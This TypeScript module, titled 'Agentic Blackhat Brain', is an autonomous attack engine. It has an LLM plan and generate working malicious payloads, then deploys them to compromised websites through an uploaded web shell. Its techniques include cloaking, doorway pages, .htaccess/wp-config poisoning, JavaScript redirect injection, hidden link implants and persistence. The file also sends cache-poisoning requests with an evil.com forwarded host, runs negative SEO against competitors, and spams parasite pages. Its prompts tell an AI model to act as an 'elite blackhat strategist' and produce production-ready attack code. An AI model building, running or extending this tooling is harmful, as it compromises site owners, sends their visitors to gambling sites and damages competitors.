/**
 * ═══════════════════════════════════════════════════════════════
 *  AGENTIC BLACKHAT BRAIN — LLM-Driven Autonomous Decision Engine
 * ═══════════════════════════════════════════════════════════════
 *
 * The AI Brain that autonomously:
 * 1. Analyzes target profile (CMS, WAF, server, vulns)
 * 2. Decides which blackhat techniques to deploy
 * 3. Generates payloads via LLM (not static templates)
 * 4. Executes attacks autonomously
 * 5. Learns from outcomes and adapts strategy
 * 6. Sends Telegram alerts on SUCCESS ONLY
 *
 * Techniques: cloaking, doorway pages, parasite SEO, negative SEO,
 * link injection, sitemap poisoning, cache poisoning, redirect networks,
 * traffic gates, JS injection, meta hijacking, config poisoning, etc.
 */

import { invokeLLM } from "./_core/llm";
import { sendTelegramNotification } from "./telegram-notifier";
import {
  webImplant, configPoison, cloakedRedirect, doorwayGen,
  sitemapPoison, indexManipulate, linkSpam, metaHijack,
  conditionalRedirect, jsInject, trafficGate, adInject,
  parasiteSeo, negativeSeo, cachePoison, redirectNetwork,
  type Payload,
} from "./blackhat-engine";
import {
  generatePostUploadPayloads, deployPostUploadPayloads,
  type DeployablePayload, type PostUploadReport,
} from "./payload-arsenal";
import { generateParasitePage } from "./seo-parasite-generator";
import {
  recordAttackOutcome, queryHistoricalPatterns,
  suggestBestStrategy, type AttackOutcome,
} from "./adaptive-learning";
import { getWafBypassProfile, type WafBypassProfile } from "./waf-bypass-strategies";
import { fetchWithPoolProxy } from "./proxy-pool";
import { getDb } from "./db";
import { eq, desc, and, sql } from "drizzle-orm";
import {
  aiAttackHistory, autonomousDeploys, strategyOutcomeLogs,
  serpDiscoveredTargets, type SerpDiscoveredTarget,
} from "../drizzle/schema";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface BlackhatBrainConfig {
  targetDomain: string;
  targetUrl: string;
  redirectUrl: string;
  seoKeywords: string[];
  userId: number;
  /** Upload URL from successful attack (if available) */
  uploadedShellUrl?: string;
  shellPassword?: string;
  /** Target profile from discovery/scan */
  targetProfile?: {
    cms?: string;
    cmsVersion?: string;
    waf?: string;
    serverType?: string;
    phpVersion?: string;
    vulnScore?: number;
  };
  /** Max techniques to try per session */
  maxTechniques?: number;
  /** Aggressiveness: 1-10 */
  aggressiveness?: number;
  /** Enable specific technique categories */
  enabledCategories?: BlackhatCategory[];
  /** Abort signal */
  signal?: AbortSignal;
}

export type BlackhatCategory =
  | "cloaking"        // UA/IP/JS cloaking
  | "doorway"         // Doorway page generation
  | "parasite"        // Parasite SEO on 3rd party platforms
  | "negative_seo"    // Negative SEO against competitors
  | "link_injection"  // Link spam/injection
  | "redirect"        // Redirect chains/networks
  | "content_manip"   // Sitemap/meta/index manipulation
  | "traffic_gate"    // Traffic distribution systems
  | "code_injection"  // JS/ad/crypto injection
  | "config_exploit"  // Config file poisoning
  | "cache_poison"    // Cache poisoning attacks
  | "post_upload";    // Post-upload payload deployment

export interface BlackhatDecision {
  technique: string;
  category: BlackhatCategory;
  reasoning: string;
  confidence: number;         // 0-100
  priority: number;           // 1=highest
  payloadConfig: Record<string, unknown>;
  estimatedImpact: "low" | "medium" | "high" | "critical";
}

export interface BlackhatExecutionResult {
  technique: string;
  category: BlackhatCategory;
  success: boolean;
  payloadsGenerated: number;
  payloadsDeployed: number;
  deployedUrls: string[];
  error?: string;
  durationMs: number;
  details: string;
}

export interface BlackhatBrainResult {
  sessionId: string;
  targetDomain: string;
  totalTechniques: number;
  successfulTechniques: number;
  failedTechniques: number;
  decisions: BlackhatDecision[];
  results: BlackhatExecutionResult[];
  totalDurationMs: number;
  aiStrategy: string;
  telegramSent: boolean;
}

// ═══════════════════════════════════════════════════════
//  TECHNIQUE REGISTRY
// ═══════════════════════════════════════════════════════

interface TechniqueDefinition {
  id: string;
  name: string;
  category: BlackhatCategory;
  description: string;
  requiresShell: boolean;
  riskLevel: "low" | "medium" | "high";
  effectivenessBase: number; // 0-100
}

const TECHNIQUE_REGISTRY: TechniqueDefinition[] = [
  // Cloaking
  { id: "php_ua_cloak", name: "PHP UA Cloaking", category: "cloaking", description: "Serve different content to search bots vs humans based on User-Agent", requiresShell: true, riskLevel: "high", effectivenessBase: 85 },
  { id: "php_ip_cloak", name: "PHP IP Cloaking", category: "cloaking", description: "Serve different content based on Google crawler IP ranges", requiresShell: true, riskLevel: "high", effectivenessBase: 80 },
  { id: "js_render_cloak", name: "JS Render Cloaking", category: "cloaking", description: "Bots see static spam, humans get JS-rendered real content", requiresShell: false, riskLevel: "medium", effectivenessBase: 70 },
  // Doorway Pages
  { id: "doorway_pages", name: "AI Doorway Pages", category: "doorway", description: "AI generates keyword-optimized doorway pages that redirect to money site", requiresShell: true, riskLevel: "high", effectivenessBase: 75 },
  { id: "doorway_city_pages", name: "City-Targeted Doorways", category: "doorway", description: "Doorway pages targeting city+keyword combinations", requiresShell: true, riskLevel: "high", effectivenessBase: 70 },
  // Parasite SEO
  { id: "parasite_web2", name: "Web 2.0 Parasite Pages", category: "parasite", description: "Create SEO-optimized pages on high-DA platforms (Medium, Notion, etc.)", requiresShell: false, riskLevel: "low", effectivenessBase: 65 },
  { id: "parasite_subdomain", name: "Subdomain Takeover Parasite", category: "parasite", description: "Take over dangling subdomains for parasite SEO", requiresShell: false, riskLevel: "medium", effectivenessBase: 60 },
  // Negative SEO
  { id: "negative_toxic_links", name: "Toxic Link Blast", category: "negative_seo", description: "Build toxic backlinks to competitor domains to trigger penalties", requiresShell: false, riskLevel: "high", effectivenessBase: 55 },
  { id: "negative_scrape_dup", name: "Content Scrape & Duplicate", category: "negative_seo", description: "Scrape competitor content and distribute as duplicates", requiresShell: false, riskLevel: "medium", effectivenessBase: 50 },
  // Link Injection
  { id: "link_spam_inject", name: "Link Spam Injection", category: "link_injection", description: "Inject spam links into target pages via comment/form exploitation", requiresShell: false, riskLevel: "medium", effectivenessBase: 60 },
  { id: "link_web_implant", name: "Web Implant Links", category: "link_injection", description: "Implant hidden links in target site files", requiresShell: true, riskLevel: "high", effectivenessBase: 80 },
  // Redirect
  { id: "conditional_redirect", name: "Conditional Redirect", category: "redirect", description: "Redirect based on referrer/UA/geo conditions", requiresShell: true, riskLevel: "high", effectivenessBase: 85 },
  { id: "redirect_network", name: "Redirect Network", category: "redirect", description: "Build multi-hop redirect chains to obscure final destination", requiresShell: false, riskLevel: "medium", effectivenessBase: 65 },
  // Content Manipulation
  { id: "sitemap_poison", name: "Sitemap Poisoning", category: "content_manip", description: "Inject spam URLs into target's sitemap.xml", requiresShell: true, riskLevel: "medium", effectivenessBase: 70 },
  { id: "meta_hijack", name: "Meta Tag Hijacking", category: "content_manip", description: "Modify meta tags to show spam content in SERPs", requiresShell: true, riskLevel: "medium", effectivenessBase: 75 },
  { id: "index_manipulate", name: "Index Manipulation", category: "content_manip", description: "Manipulate index files to inject spam content", requiresShell: true, riskLevel: "high", effectivenessBase: 80 },
  // Traffic Gate
  { id: "traffic_gate_tds", name: "Traffic Distribution System", category: "traffic_gate", description: "AI-driven TDS that routes traffic based on geo/device/referrer", requiresShell: true, riskLevel: "high", effectivenessBase: 75 },
  // Code Injection
  { id: "js_inject_redirect", name: "JS Injection Redirect", category: "code_injection", description: "Inject JavaScript that redirects users to money site", requiresShell: true, riskLevel: "high", effectivenessBase: 80 },
  { id: "ad_inject", name: "Ad Code Injection", category: "code_injection", description: "Inject ad network code for monetization", requiresShell: true, riskLevel: "medium", effectivenessBase: 60 },
  // Config Exploit
  { id: "config_poison", name: "Config File Poisoning", category: "config_exploit", description: "Modify .htaccess/wp-config for redirects and SEO manipulation", requiresShell: true, riskLevel: "high", effectivenessBase: 85 },
  // Cache Poison
  { id: "cache_poison_redirect", name: "Cache Poisoning Redirect", category: "cache_poison", description: "Poison CDN/proxy cache to serve redirects", requiresShell: false, riskLevel: "medium", effectivenessBase: 55 },
  // Post-Upload
  { id: "post_upload_full", name: "Full Post-Upload Deployment", category: "post_upload", description: "Deploy persistence, cloaking, SEO manipulation, doorways via uploaded shell", requiresShell: true, riskLevel: "high", effectivenessBase: 90 },
];

// ═══════════════════════════════════════════════════════
//  AI STRATEGIST — LLM Plans the Attack
// ═══════════════════════════════════════════════════════

async function aiPlanBlackhatStrategy(
  config: BlackhatBrainConfig,
  historicalData: Record<string, unknown> | null,
): Promise<BlackhatDecision[]> {
  const availableTechniques = TECHNIQUE_REGISTRY.filter(t => {
    // Filter by shell availability
    if (t.requiresShell && !config.uploadedShellUrl) return false;
    // Filter by enabled categories
    if (config.enabledCategories && !config.enabledCategories.includes(t.category)) return false;
    return true;
  });

  if (availableTechniques.length === 0) {
    // No shell = only non-shell techniques
    return TECHNIQUE_REGISTRY
      .filter(t => !t.requiresShell)
      .slice(0, config.maxTechniques || 5)
      .map((t, i) => ({
        technique: t.id,
        category: t.category,
        reasoning: "No shell available — using non-shell techniques only",
        confidence: t.effectivenessBase,
        priority: i + 1,
        payloadConfig: {},
        estimatedImpact: t.effectivenessBase > 70 ? "high" as const : "medium" as const,
      }));
  }

  try {
    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `You are an elite blackhat SEO AI strategist. Your job is to analyze a target website and decide which blackhat techniques to deploy for maximum SEO impact.

AVAILABLE TECHNIQUES:
${availableTechniques.map(t => `- ${t.id}: ${t.description} [risk: ${t.riskLevel}, base_effectiveness: ${t.effectivenessBase}]`).join("\n")}

RULES:
1. Analyze the target profile (CMS, WAF, server) to select the BEST techniques.
2. For WordPress targets: prioritize cloaking, config_poison, doorway_pages, post_upload_full.
3. For targets WITH shell access: use ALL shell-dependent techniques for maximum impact.
4. For targets WITHOUT shell: focus on parasite_web2, negative_toxic_links, cache_poison_redirect, link_spam_inject.
5. Aggressiveness level affects how many high-risk techniques to include.
6. Order by PRIORITY (most impactful first).
7. Include reasoning for EACH technique choice.
8. Use historical success data to boost/demote techniques.
9. For gambling/casino keywords: always include doorway_pages and parasite_web2.
10. NEVER include techniques that require shell if no shell URL is provided.

Return JSON array of decisions.`,
        },
        {
          role: "user",
          content: JSON.stringify({
            target: {
              domain: config.targetDomain,
              url: config.targetUrl,
              redirectUrl: config.redirectUrl,
              keywords: config.seoKeywords,
              cms: config.targetProfile?.cms || "unknown",
              cmsVersion: config.targetProfile?.cmsVersion,
              waf: config.targetProfile?.waf || "none",
              serverType: config.targetProfile?.serverType,
              phpVersion: config.targetProfile?.phpVersion,
              vulnScore: config.targetProfile?.vulnScore || 0,
              hasShell: !!config.uploadedShellUrl,
              shellUrl: config.uploadedShellUrl || null,
            },
            aggressiveness: config.aggressiveness || 7,
            maxTechniques: config.maxTechniques || 10,
            historicalData,
            availableTechniqueIds: availableTechniques.map(t => t.id),
          }),
        },
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "blackhat_strategy",
          strict: true,
          schema: {
            type: "object",
            properties: {
              decisions: {
                type: "array",
                items: {
                  type: "object",
                  properties: {
                    technique: { type: "string" },
                    category: { type: "string" },
                    reasoning: { type: "string" },
                    confidence: { type: "integer" },
                    priority: { type: "integer" },
                    estimatedImpact: { type: "string" },
                    doorwayCount: { type: "integer" },
                    parasiteCount: { type: "integer" },
                    linkCount: { type: "integer" },
                    niche: { type: "string" },
                    intensity: { type: "integer" },
                  },
                  required: ["technique", "category", "reasoning", "confidence", "priority", "estimatedImpact", "doorwayCount", "parasiteCount", "linkCount", "niche", "intensity"],
                  additionalProperties: false,
                },
              },
              overallStrategy: { type: "string" },
            },
            required: ["decisions", "overallStrategy"],
            additionalProperties: false,
          },
        },
      },
    });

    const content = response.choices?.[0]?.message?.content;
    if (content && typeof content === "string") {
      const parsed = JSON.parse(content);
      // Validate and map decisions
      const validTechniqueIds = new Set(availableTechniques.map(t => t.id));
      const decisions: BlackhatDecision[] = (parsed.decisions || [])
        .filter((d: any) => validTechniqueIds.has(d.technique))
        .slice(0, config.maxTechniques || 10)
        .map((d: any, i: number) => {
          const techDef = TECHNIQUE_REGISTRY.find(t => t.id === d.technique)!;
          return {
            technique: d.technique,
            category: techDef.category,
            reasoning: d.reasoning || "AI selected",
            confidence: Math.min(100, Math.max(0, d.confidence || techDef.effectivenessBase)),
            priority: d.priority || i + 1,
            payloadConfig: {
              doorwayCount: d.doorwayCount || 20,
              parasiteCount: d.parasiteCount || 5,
              linkCount: d.linkCount || 30,
              niche: d.niche || "online-casino",
              intensity: d.intensity || (config.aggressiveness || 7) * 10,
            },
            estimatedImpact: (["low", "medium", "high", "critical"].includes(d.estimatedImpact) ? d.estimatedImpact : "medium") as BlackhatDecision["estimatedImpact"],
          };
        });

      if (decisions.length > 0) return decisions;
    }
  } catch (e: any) {
    console.error(`[BlackhatBrain] AI strategy planning failed: ${e.message}`);
  }

  // Fallback: use top techniques by effectiveness
  return availableTechniques
    .sort((a, b) => b.effectivenessBase - a.effectivenessBase)
    .slice(0, config.maxTechniques || 8)
    .map((t, i) => ({
      technique: t.id,
      category: t.category,
      reasoning: "Fallback: sorted by base effectiveness",
      confidence: t.effectivenessBase,
      priority: i + 1,
      payloadConfig: {
        doorwayCount: 20,
        parasiteCount: 5,
        linkCount: 30,
        niche: "online-casino",
        intensity: (config.aggressiveness || 7) * 10,
      },
      estimatedImpact: t.effectivenessBase > 75 ? "high" as const : "medium" as const,
    }));
}

// ═══════════════════════════════════════════════════════
//  AI PAYLOAD GENERATOR — LLM Creates Custom Payloads
// ═══════════════════════════════════════════════════════

async function aiGeneratePayload(
  technique: string,
  targetDomain: string,
  redirectUrl: string,
  keywords: string[],
  config: Record<string, unknown>,
): Promise<{ code: string; filename: string; contentType: string; description: string }> {
  try {
    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `You are an expert blackhat SEO payload generator. Generate a REAL, WORKING payload for the specified technique.
The payload must be production-ready PHP/HTML/JS code that actually works when deployed.
For gambling/casino niches, use Thai language content mixed with English brand names.
Include proper SEO meta tags, schema markup, and keyword density.
CRITICAL: Generate ACTUAL executable code, not placeholders or examples.`,
        },
        {
          role: "user",
          content: JSON.stringify({
            technique,
            targetDomain,
            redirectUrl,
            keywords: keywords.slice(0, 10),
            config,
          }),
        },
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "payload",
          strict: true,
          schema: {
            type: "object",
            properties: {
              code: { type: "string" },
              filename: { type: "string" },
              contentType: { type: "string" },
              description: { type: "string" },
            },
            required: ["code", "filename", "contentType", "description"],
            additionalProperties: false,
          },
        },
      },
    });

    const content = response.choices?.[0]?.message?.content;
    if (content && typeof content === "string") {
      return JSON.parse(content);
    }
  } catch (e: any) {
    console.error(`[BlackhatBrain] AI payload generation failed for ${technique}: ${e.message}`);
  }

  // Fallback: use static generator
  return {
    code: `<?php header("Location: ${redirectUrl}", true, 302); exit; ?>`,
    filename: `${technique}-${Date.now()}.php`,
    contentType: "application/x-php",
    description: `Fallback redirect for ${technique}`,
  };
}

// ═══════════════════════════════════════════════════════
//  AUTONOMOUS EXECUTORS — Execute Each Technique
// ═══════════════════════════════════════════════════════

async function executeTechnique(
  decision: BlackhatDecision,
  config: BlackhatBrainConfig,
): Promise<BlackhatExecutionResult> {
  const startTime = Date.now();
  const targetUrl = config.targetUrl;
  const redirectUrl = config.redirectUrl;
  const domain = config.targetDomain;
  const keywords = config.seoKeywords;
  const payloadConfig = decision.payloadConfig;

  try {
    switch (decision.technique) {
      // ─── CLOAKING ───
      case "php_ua_cloak":
      case "php_ip_cloak":
      case "js_render_cloak": {
        const payloads = cloakedRedirect(targetUrl, redirectUrl);
        const targetPayload = payloads.find(p => p.type === decision.technique) || payloads[0];
        // Generate AI-enhanced cloaking payload
        const aiPayload = await aiGeneratePayload(
          decision.technique, domain, redirectUrl, keywords,
          { ...payloadConfig, existingPayload: targetPayload?.code?.substring(0, 200) },
        );
        // Deploy via shell if available
        let deployed = false;
        let deployedUrl = "";
        if (config.uploadedShellUrl && config.shellPassword) {
          try {
            const deployResult = await deployViaShell(
              config.uploadedShellUrl, config.shellPassword,
              aiPayload.filename, aiPayload.code,
            );
            deployed = deployResult.success;
            deployedUrl = deployResult.url || "";
          } catch { /* continue */ }
        }
        return {
          technique: decision.technique,
          category: decision.category,
          success: deployed,
          payloadsGenerated: payloads.length,
          payloadsDeployed: deployed ? 1 : 0,
          deployedUrls: deployed ? [deployedUrl] : [],
          durationMs: Date.now() - startTime,
          details: deployed
            ? `AI cloaking deployed at ${deployedUrl}`
            : `Generated ${payloads.length} cloaking payloads (deployment pending)`,
        };
      }

      // ─── DOORWAY PAGES ───
      case "doorway_pages":
      case "doorway_city_pages": {
        const count = (payloadConfig.doorwayCount as number) || 20;
        const niche = (payloadConfig.niche as string) || "online-casino";
        const payloads = doorwayGen(targetUrl, count, niche);
        // Generate AI-enhanced doorway pages
        const aiDoorways: string[] = [];
        for (let i = 0; i < Math.min(3, count); i++) {
          try {
            const aiPage = await aiGeneratePayload(
              "doorway_page", domain, redirectUrl, keywords,
              { niche, pageIndex: i, totalPages: count },
            );
            aiDoorways.push(aiPage.code);
          } catch { break; }
        }
        // Deploy via shell
        let deployedCount = 0;
        const deployedUrls: string[] = [];
        if (config.uploadedShellUrl && config.shellPassword) {
          for (const payload of payloads.slice(0, 10)) {
            try {
              const filename = `${niche}-${Date.now()}-${deployedCount}.html`;
              const result = await deployViaShell(
                config.uploadedShellUrl, config.shellPassword,
                filename, payload.code || "",
              );
              if (result.success) {
                deployedCount++;
                if (result.url) deployedUrls.push(result.url);
              }
            } catch { /* continue */ }
          }
        }
        return {
          technique: decision.technique,
          category: decision.category,
          success: deployedCount > 0,
          payloadsGenerated: payloads.length + aiDoorways.length,
          payloadsDeployed: deployedCount,
          deployedUrls,
          durationMs: Date.now() - startTime,
          details: `Generated ${payloads.length} doorway pages + ${aiDoorways.length} AI-enhanced. Deployed: ${deployedCount}`,
        };
      }

      // ─── PARASITE SEO ───
      case "parasite_web2":
      case "parasite_subdomain": {
        const parasiteCount = (payloadConfig.parasiteCount as number) || 5;
        const parasitePayloads = parasiteSeo(targetUrl, parasiteCount);
        // Generate AI parasite content
        const deployedUrls: string[] = [];
        for (let i = 0; i < Math.min(parasiteCount, 3); i++) {
          try {
            const parasitePage = await generateParasitePage({
              targetDomain: domain,
              redirectUrl,
      keywords: keywords.slice(0, 5),
      language: "th",
      contentLength: "long",
      includeSchema: true,
      includeFaq: true,
            });
            // Try to post to Telegraph (free, no auth, dofollow DA 91)
            try {
              const telegraphResult = await postToTelegraph(
                parasitePage.title || `${keywords[0]} - ${domain}`,
                parasitePage.html,
              );
              if (telegraphResult.url) {
                deployedUrls.push(telegraphResult.url);
              }
            } catch { /* continue */ }
          } catch { /* continue */ }
        }
        return {
          technique: decision.technique,
          category: decision.category,
          success: deployedUrls.length > 0,
          payloadsGenerated: parasitePayloads.length,
          payloadsDeployed: deployedUrls.length,
          deployedUrls,
          durationMs: Date.now() - startTime,
          details: `Parasite SEO: ${deployedUrls.length} pages deployed on external platforms`,
        };
      }

      // ─── NEGATIVE SEO ───
      case "negative_toxic_links":
      case "negative_scrape_dup": {
        const intensity = (payloadConfig.intensity as number) || 50;
        const payloads = negativeSeo(domain, intensity);
        // AI generates negative SEO strategy
        const aiNegSeo = await aiGeneratePayload(
          "negative_seo", domain, redirectUrl, keywords,
          { intensity, competitorDomain: domain },
        );
        return {
          technique: decision.technique,
          category: decision.category,
          success: payloads.length > 0,
          payloadsGenerated: payloads.length,
          payloadsDeployed: 0, // Negative SEO doesn't deploy to target
          deployedUrls: [],
          durationMs: Date.now() - startTime,
          details: `Negative SEO: Generated ${payloads.length} toxic link profiles at intensity ${intensity}. AI strategy: ${aiNegSeo.description}`,
        };
      }

      // ─── LINK INJECTION ───
      case "link_spam_inject": {
        const count = (payloadConfig.linkCount as number) || 30;
        const payloads = linkSpam(targetUrl, count);
        return {
          technique: decision.technique,
          category: decision.category,
          success: payloads.length > 0,
          payloadsGenerated: payloads.length,
          payloadsDeployed: 0,
          deployedUrls: [],
          durationMs: Date.now() - startTime,
          details: `Link spam: Generated ${payloads.length} spam link payloads`,
        };
      }
      case "link_web_implant": {
        const payloads = webImplant(targetUrl);
        let deployedCount = 0;
        const deployedUrls: string[] = [];
        if (config.uploadedShellUrl && config.shellPassword) {
          for (const payload of payloads.slice(0, 5)) {
            try {
              const result = await deployViaShell(
                config.uploadedShellUrl, config.shellPassword,
                `implant-${Date.now()}.php`, payload.code || "",
              );
              if (result.success) {
                deployedCount++;
                if (result.url) deployedUrls.push(result.url);
              }
            } catch { /* continue */ }
          }
        }
        return {
          technique: decision.technique,
          category: decision.category,
          success: deployedCount > 0,
          payloadsGenerated: payloads.length,
          payloadsDeployed: deployedCount,
          deployedUrls,
          durationMs: Date.now() - startTime,
          details: `Web implant: ${deployedCount}/${payloads.length} implants deployed`,
        };
      }

      // ─── REDIRECT ───
      case "conditional_redirect": {
        const payloads = conditionalRedirect(targetUrl, redirectUrl);
        let deployed = false;
        let deployedUrl = "";
        if (config.uploadedShellUrl && config.shellPassword) {
          const aiPayload = await aiGeneratePayload(
            "conditional_redirect", domain, redirectUrl, keywords,
            { ...payloadConfig },
          );
          try {
            const result = await deployViaShell(
              config.uploadedShellUrl, config.shellPassword,
              aiPayload.filename, aiPayload.code,
            );
            deployed = result.success;
            deployedUrl = result.url || "";
          } catch { /* continue */ }
        }
        return {
          technique: decision.technique,
          category: decision.category,
          success: deployed,
          payloadsGenerated: payloads.length,
          payloadsDeployed: deployed ? 1 : 0,
          deployedUrls: deployed ? [deployedUrl] : [],
          durationMs: Date.now() - startTime,
          details: deployed
            ? `Conditional redirect deployed at ${deployedUrl}`
            : `Generated ${payloads.length} conditional redirect payloads`,
        };
      }
      case "redirect_network": {
        const hops = Math.min((payloadConfig.linkCount as number) || 5, 10);
        const payloads = redirectNetwork(targetUrl, hops);
        return {
          technique: decision.technique,
          category: decision.category,
          success: payloads.length > 0,
          payloadsGenerated: payloads.length,
          payloadsDeployed: 0,
          deployedUrls: [],
          durationMs: Date.now() - startTime,
          details: `Redirect network: ${payloads.length} hop chain generated`,
        };
      }

      // ─── CONTENT MANIPULATION ───
      case "sitemap_poison": {
        const count = (payloadConfig.linkCount as number) || 50;
        const payloads = sitemapPoison(targetUrl, count);
        let deployed = false;
        let deployedUrl = "";
        if (config.uploadedShellUrl && config.shellPassword) {
          try {
            const sitemapPayload = payloads[0];
            const result = await deployViaShell(
              config.uploadedShellUrl, config.shellPassword,
              "sitemap-inject.xml", sitemapPayload?.code || "",
            );
            deployed = result.success;
            deployedUrl = result.url || "";
          } catch { /* continue */ }
        }
        return {
          technique: decision.technique,
          category: decision.category,
          success: deployed,
          payloadsGenerated: payloads.length,
          payloadsDeployed: deployed ? 1 : 0,
          deployedUrls: deployed ? [deployedUrl] : [],
          durationMs: Date.now() - startTime,
          details: `Sitemap poisoning: ${count} spam URLs injected`,
        };
      }
      case "meta_hijack": {
        const payloads = metaHijack(targetUrl, redirectUrl);
        let deployed = false;
        if (config.uploadedShellUrl && config.shellPassword) {
          try {
            const result = await deployViaShell(
              config.uploadedShellUrl, config.shellPassword,
              "meta-inject.php", payloads[0]?.code || "",
            );
            deployed = result.success;
          } catch { /* continue */ }
        }
        return {
          technique: decision.technique,
          category: decision.category,
          success: deployed,
          payloadsGenerated: payloads.length,
          payloadsDeployed: deployed ? 1 : 0,
          deployedUrls: [],
          durationMs: Date.now() - startTime,
          details: `Meta hijack: ${deployed ? "deployed" : "generated"} ${payloads.length} meta manipulation payloads`,
        };
      }
      case "index_manipulate": {
        const payloads = indexManipulate(targetUrl, redirectUrl);
        let deployed = false;
        if (config.uploadedShellUrl && config.shellPassword) {
          try {
            const result = await deployViaShell(
              config.uploadedShellUrl, config.shellPassword,
              "index-mod.php", payloads[0]?.code || "",
            );
            deployed = result.success;
          } catch { /* continue */ }
        }
        return {
          technique: decision.technique,
          category: decision.category,
          success: deployed,
          payloadsGenerated: payloads.length,
          payloadsDeployed: deployed ? 1 : 0,
          deployedUrls: [],
          durationMs: Date.now() - startTime,
          details: `Index manipulation: ${deployed ? "deployed" : "generated"} ${payloads.length} index payloads`,
        };
      }

      // ─── TRAFFIC GATE ───
      case "traffic_gate_tds": {
        const payloads = trafficGate(targetUrl, redirectUrl);
        let deployed = false;
        let deployedUrl = "";
        if (config.uploadedShellUrl && config.shellPassword) {
          const aiPayload = await aiGeneratePayload(
            "traffic_gate", domain, redirectUrl, keywords,
            { ...payloadConfig },
          );
          try {
            const result = await deployViaShell(
              config.uploadedShellUrl, config.shellPassword,
              aiPayload.filename, aiPayload.code,
            );
            deployed = result.success;
            deployedUrl = result.url || "";
          } catch { /* continue */ }
        }
        return {
          technique: decision.technique,
          category: decision.category,
          success: deployed,
          payloadsGenerated: payloads.length,
          payloadsDeployed: deployed ? 1 : 0,
          deployedUrls: deployed ? [deployedUrl] : [],
          durationMs: Date.now() - startTime,
          details: `TDS: ${deployed ? `deployed at ${deployedUrl}` : `generated ${payloads.length} TDS payloads`}`,
        };
      }

      // ─── CODE INJECTION ───
      case "js_inject_redirect": {
        const payloads = jsInject(targetUrl, redirectUrl);
        let deployed = false;
        if (config.uploadedShellUrl && config.shellPassword) {
          try {
            const result = await deployViaShell(
              config.uploadedShellUrl, config.shellPassword,
              "js-inject.php", payloads[0]?.code || "",
            );
            deployed = result.success;
          } catch { /* continue */ }
        }
        return {
          technique: decision.technique,
          category: decision.category,
          success: deployed,
          payloadsGenerated: payloads.length,
          payloadsDeployed: deployed ? 1 : 0,
          deployedUrls: [],
          durationMs: Date.now() - startTime,
          details: `JS injection: ${deployed ? "deployed" : "generated"} ${payloads.length} JS payloads`,
        };
      }
      case "ad_inject": {
        const payloads = adInject(targetUrl);
        return {
          technique: decision.technique,
          category: decision.category,
          success: payloads.length > 0,
          payloadsGenerated: payloads.length,
          payloadsDeployed: 0,
          deployedUrls: [],
          durationMs: Date.now() - startTime,
          details: `Ad injection: ${payloads.length} ad code payloads generated`,
        };
      }

      // ─── CONFIG EXPLOIT ───
      case "config_poison": {
        const payloads = configPoison(targetUrl, redirectUrl);
        let deployed = false;
        if (config.uploadedShellUrl && config.shellPassword) {
          // AI generates smarter config poison
          const aiPayload = await aiGeneratePayload(
            "config_poison", domain, redirectUrl, keywords,
            { cms: config.targetProfile?.cms },
          );
          try {
            const result = await deployViaShell(
              config.uploadedShellUrl, config.shellPassword,
              aiPayload.filename, aiPayload.code,
            );
            deployed = result.success;
          } catch { /* continue */ }
        }
        return {
          technique: decision.technique,
          category: decision.category,
          success: deployed,
          payloadsGenerated: payloads.length,
          payloadsDeployed: deployed ? 1 : 0,
          deployedUrls: [],
          durationMs: Date.now() - startTime,
          details: `Config poison: ${deployed ? "deployed" : "generated"} ${payloads.length} config payloads`,
        };
      }

      // ─── CACHE POISON ───
      case "cache_poison_redirect": {
        const payloads = cachePoison(targetUrl, redirectUrl);
        // Try actual cache poisoning via HTTP requests
        let success = false;
        try {
          const poisonHeaders: Record<string, string> = {
            "X-Forwarded-Host": `${domain}.evil.com`,
            "X-Original-URL": `/${redirectUrl}`,
            "X-Rewrite-URL": `/${redirectUrl}`,
            "X-Forwarded-Scheme": "nothttps",
          };
      const proxyResult = await fetchWithPoolProxy(`https://${domain}/`, {
        method: "GET",
        headers: poisonHeaders,
        redirect: "manual",
      });
      success = proxyResult.response.status >= 200 && proxyResult.response.status < 400;
        } catch { /* continue */ }
        return {
          technique: decision.technique,
          category: decision.category,
          success,
          payloadsGenerated: payloads.length,
          payloadsDeployed: success ? 1 : 0,
          deployedUrls: [],
          durationMs: Date.now() - startTime,
          details: `Cache poison: ${success ? "cache poisoned successfully" : "cache poisoning attempted"} with ${payloads.length} techniques`,
        };
      }

      // ─── POST-UPLOAD FULL DEPLOYMENT ───
      case "post_upload_full": {
        if (!config.uploadedShellUrl || !config.shellPassword) {
          return {
            technique: decision.technique,
            category: decision.category,
            success: false,
            payloadsGenerated: 0,
            payloadsDeployed: 0,
            deployedUrls: [],
            error: "No shell URL available for post-upload deployment",
            durationMs: Date.now() - startTime,
            details: "Post-upload requires an uploaded shell",
          };
        }
        const payloads = generatePostUploadPayloads(domain, redirectUrl, {
          enableSeoManipulation: true,
          enablePersistence: true,
          enableCloaking: true,
          enableMonetization: false,
          enableRedirects: true,
          doorwayCount: (payloadConfig.doorwayCount as number) || 20,
          sitemapUrls: 100,
          linkCount: (payloadConfig.linkCount as number) || 30,
        });
        let report: PostUploadReport | null = null;
        try {
          report = await deployPostUploadPayloads(
            domain,
            config.uploadedShellUrl,
            config.shellPassword,
            payloads,
            () => {}, // silent progress
          );
        } catch (e: any) {
          return {
            technique: decision.technique,
            category: decision.category,
            success: false,
            payloadsGenerated: payloads.length,
            payloadsDeployed: 0,
            deployedUrls: [],
            error: e.message,
            durationMs: Date.now() - startTime,
            details: `Post-upload deployment failed: ${e.message}`,
          };
        }
        return {
          technique: decision.technique,
          category: decision.category,
          success: (report?.successCount || 0) > 0,
          payloadsGenerated: payloads.length,
          payloadsDeployed: report?.successCount || 0,
          deployedUrls: report?.results?.filter((r: any) => r.success).map((r: any) => r.url || "") || [],
          durationMs: Date.now() - startTime,
          details: `Post-upload: ${report?.successCount}/${payloads.length} payloads deployed (${report?.failCount} failed)`,
        };
      }

      default:
        return {
          technique: decision.technique,
          category: decision.category,
          success: false,
          payloadsGenerated: 0,
          payloadsDeployed: 0,
          deployedUrls: [],
          error: `Unknown technique: ${decision.technique}`,
          durationMs: Date.now() - startTime,
          details: `Unknown technique: ${decision.technique}`,
        };
    }
  } catch (error: any) {
    return {
      technique: decision.technique,
      category: decision.category,
      success: false,
      payloadsGenerated: 0,
      payloadsDeployed: 0,
      deployedUrls: [],
      error: error.message,
      durationMs: Date.now() - startTime,
      details: `Execution error: ${error.message}`,
    };
  }
}

// ═══════════════════════════════════════════════════════
